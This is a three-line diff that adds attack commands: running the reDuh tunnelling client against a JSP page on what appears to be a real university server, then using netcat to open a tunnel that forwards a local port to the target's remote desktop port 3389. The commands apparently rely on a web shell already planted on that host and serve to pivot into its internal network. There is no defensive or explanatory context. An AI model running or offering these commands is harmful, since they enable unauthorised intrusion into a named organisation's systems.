@@ -1,0 +1,3 @@
+java -jar reDuhClient.jar http://oa.nsmc.edu.cn/yyoa/rel_online.jsp
+nc -vv localhost 1010
+[createTunnel]1234:127.0.0.1:3389
